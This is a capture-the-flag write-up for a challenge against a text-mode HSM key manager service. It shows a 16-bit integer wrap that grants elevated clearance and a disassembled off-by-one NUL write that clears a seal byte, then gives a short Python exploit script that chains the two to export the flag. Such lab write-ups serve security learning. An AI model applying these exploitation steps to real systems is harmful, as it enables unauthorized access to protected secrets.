---
title: "AIZEN · Ishikawa Goemon"
platform: "HackerLab Benin 2026 (H4ckd4ne)"
category: "web-hsm"
difficulty: "—"
points: 200
os: "—"
date: 2026-11-20
author: "H4ckd4ne"
author_github: "H4ckd4ne"
source: "https://github.com/H4ckd4ne/hackerlab2026-writeups/blob/main/aizen/ishikawa-goemon/writeup-ishikawa-goemon.md"
license: "CC BY-SA 4.0"
status: published
---

# Write-up — Ishikawa Goemon (HSM Key Controller)

## Objective

The target is a text-mode HSM key manager (`172.28.19.2:9000`, "Vantage Hosting —
Mirova DC", HSM Key Controller v3.2.1). A remote operator can register a session
with limited credits, browse a key ring, buy tokens, allocate key pairs and read
an audit log. Option `[7] Master Key Export` is reserved for `ELEVATED` clearance
and additionally asks for an "Unlock PIN". The goal is to reach the master-key
export and recover the platform flag.

Assets provided:

- `vault-keyctl` — stripped x86-64 PIE ELF, the exact binary served over TCP.
- `ishikawa.conf` — WireGuard profile for the `172.28.19.0/24` challenge network.

## Initial state and surface mapping

The service is a raw-TCP menu with heavy ANSI colouring and prompts that do not
end with a newline (`Operator ID: `, `Order quantity: `, `Unlock PIN: `). A small
stdlib client was written (`hsm.py`) that connects, strips ANSI and can wait for
a specific prompt.

Registration flow and menu (fresh session):

```
Operator ID: op
  Session initialized.
  Operator op registered.

Dashboard:  Credits 1000 | Tokens 0 | Key pairs 0/256 | Clearance STANDARD
[1] Dashboard   [2] Key Ring     [3] Token Market  [4] Allocate Key Pair
[5] Audit Log   [6] Diagnostics  [7] Master Key Export
```

Observations from the live service and from `strings vault-keyctl`:

- `[2]` lists eight static keys (K-001 … K-008) with algorithms, owners, status.
- `[5]` prints ten static audit rows — no PIN, no secret.
- `[6]` is a static diagnostics banner.
- `[7]` while `STANDARD` prints `Access denied. Elevated clearance required.`
- The binary stores the flag coming from `getenv("FLAG")` and falls back to a
  test string if the variable is unset. That environment lookup is what makes
  `[7]` the flag sink.

## Getting `ELEVATED` clearance: credit cost integer wrap

The token market asks for a quantity and charges `credits = quantity * UNIT`
in 16-bit arithmetic, while the token counter itself is 32-bit. Sending a
quantity of `65536` makes the 16-bit cost wrap to zero:

```
Order quantity: 65536
  Order confirmed.
  Credits: 1000 | Tokens: 65536

Dashboard:
  Clearance : ELEVATED
  Credits   :  1000
  Tokens    : 65536
```

So the clearance upgrade is driven by the token count, and no credit is actually
spent. Negative, zero and huge quantities are rejected by explicit checks
(`Insufficient credits`, `Invalid quantity`), so `65536` is the sweet spot.

At this point `[7]` gets past the clearance gate:

```
  Verifying clearance... OK
  Decrypting key store..... OK
  Unlock PIN:
```

The PIN check is the remaining barrier. Wrong PINs only produce
`Export denied. Seal active.` plus `Audit ref: <8 hex digits>`, which is the
FNV-1a hash of whatever PIN was typed, not the expected value.

## Reverse engineering the PIN check

The binary is stripped; all logic lives in `main`. Disassembly with the ANSI
colour disabled keeps the listing readable:

```
r2 -q -e scr.color=0 -c 'aa; s main; pdf' vault-keyctl > main.txt
```

The relevant block, after the `Unlock PIN:` prompt:

```
0x2ad2  xor eax, eax
0x2ad4  mov ecx, 0x91            ; 145 = 16 (PIN) + 1 (seal byte) + 128 (flag)
0x2ad9  mov rdi, r14             ; r14 = rsp+0x20
0x2adc  rep stosb                ; zero the three contiguous regions
0x2ade  lea rdi, str.FLAG
0x2ae5  mov byte [var_30h], 1    ; seal = 1 (armed)
0x2aea  call getenv              ; flag from environment
...
0x2b03  lea r13, [var_31h]       ; flag buffer at rsp+0x31
0x2b08  mov esi, 0x80
0x2b12  lea rdx, str."%s"
0x2b19  call snprintf            ; flag copied into rsp+0x31
```

The PIN is read one byte at a time into the buffer at `rsp+0x20`, at most 16
bytes, stopping on newline:

```
loop:
0x2b39  xor edi, edi             ; fd 0
0x2b3b  mov edx, 1               ; one byte
0x2b40  mov rsi, r15             ; scratch byte
0x2b43  call read
0x2b4c  jne loop                 ; short read? retry
0x2b4e  movzx eax, byte [rsp+0x1f]
0x2b53  cmp al, 0x0a             ; '\n' ends input
0x2b57  mov byte [r14 + r12], al ; PIN[len] = byte
0x2b5b  add r12, 1
0x2b5f  cmp r12, 0x10            ; 16 bytes max
0x2b63  jne loop
```

Then the terminator and the hash:

```
0x2b65  movsxd rax, r12d
0x2b6a  mov r12d, 0x811c9dc5     ; FNV-1a 32-bit offset basis
0x2b70  mov byte [rsp + rax + 0x20], 0   ; PIN[len] = '\0'
0x2b75  movzx eax, byte [r14 + rdx]
...
0x2b7e  xor r12d, eax
0x2b85  imul r12d, r12d, 0x1000193
0x2b8c  cmp rdx, 0x10
0x2b90  jne 0x2b75
0x2b92  mov edi, 0x3d090         ; cosmetic 250 ms delay
0x2b97  call usleep
0x2b9c  cmp byte [var_30h], 0    ; <- the only real gate
0x2ba1  jne 0x302c               ; seal armed => "Export denied. Seal active."
```

The critical detail: the seal byte `var_30h` is at `rsp+0x30`, and the PIN buffer
starts at `rsp+0x20` with a maximum length of 16. Therefore the line

```
0x2b70  mov byte [rsp + rax + 0x20], 0
```

writes the NUL terminator **one byte past the last legal PIN byte**: with a
16-byte PIN (`rax = 16`), the zero lands exactly on `rsp+0x30`, clearing the
seal flag. The hash is computed but never compared to a stored value — the
seal byte was the entire check, and the "PIN" is only a length trigger.

There is no off-by-one in the read loop itself; the overflow is purely the
NUL-termination write.

## Exploit

With `ELEVATED` clearance from the token-market wrap, send 16 characters as the
PIN. The termination byte disarms the seal and execution falls through to the
classified export box, which prints the environment-provided flag:

```
python3 - <<'EOF'
from hsm import HSM
h = HSM(); h.recv()
h.ask("1"); h.ask("op")          # register operator
h.ask("3"); h.ask("65536")       # token wrap -> ELEVATED
h.ask("7", quiet=1.0)            # export, waits for "Unlock PIN:"
h.send("A" * 16)                 # 16-byte PIN zeroes the seal byte
print(h.recv(quiet=1.2).decode("utf-8", "replace"))
h.close()
EOF
```

Resulting screen (flag redacted here):

```
  ╔══════════════════════════════════════════╗
  ║ CLASSIFIED -- Master Key Export          ║
  ║                                          ║
  ║  <platform flag>                         ║
  ║                                          ║
  ║ Handle per policy MK-01.                 ║
  ╚══════════════════════════════════════════╝
  Export logged. Ref: AX-7741.
```

The recovered value was submitted to the platform.

## Failed paths

- **Brute forcing the PIN.** The only feedback is the FNV-1a hash of the
  submitted PIN (`Audit ref: %08X`), which is not the expected value; the space
  is 16 bytes and each attempt costs a 250 ms `usleep`, so it is a dead end.
- **Hunting an expected-hash leak.** The string
  `PIN hash mismatch: expected %08X, got %08X` exists in `.rodata` but has no
  reachable cross-reference in `main`, so it cannot be used to disclose the
  expected hash.
- **Negative / oversized quantities.** `-10`, `0` and `9999999999999999999`
  are rejected; only `65536` wraps the 16-bit cost to zero.
- **Looking for the PIN in the key ring or audit log.** Both are static data
  compiled into the binary; neither contains a secret.
- **Menu-driven state changes.** Allocate Key Pair only decrements the token
  counter; no menu action modifies the seal byte before `[7]`.

## Reproducible validation (without disclosing the answer)

1. Connect to the target and read the banner.
2. `1` then an operator ID (≥ 3 characters) to register.
3. `3` then `65536`; the dashboard (`1`) must show `Clearance : ELEVATED` and
   the full token count with credits unchanged.
4. `7`; the service must answer `Verifying clearance... OK`,
   `Decrypting key store..... OK` and prompt `Unlock PIN:`.
5. Send exactly 16 characters (for example `A` repeated 16 times).
6. The classified export box must be printed. Confirm the embedded value has
   the platform flag format and submit it.

Control test: repeat steps 1–5 with a 15-character PIN; the service must instead
print `Export denied. Seal active.` and an `Audit ref:` hash, proving the
16th byte is what disarms the seal.

## Lessons learned

- In this kind of binary, the "authentication" is often a boolean in an
  adjacent stack slot; count the sizes of the buffers that are zeroed and
  string-terminated together.
- 16-bit arithmetic on a price field plus a 32-bit counter is a classic wrap:
  look for a `movzx`/`%hu` cost against a `%u` balance.
- A stripped binary is not an obstacle if the whole program is one `main`:
  the menu dispatch is a jump table near the input comparison, and each case
  contains its own gate.
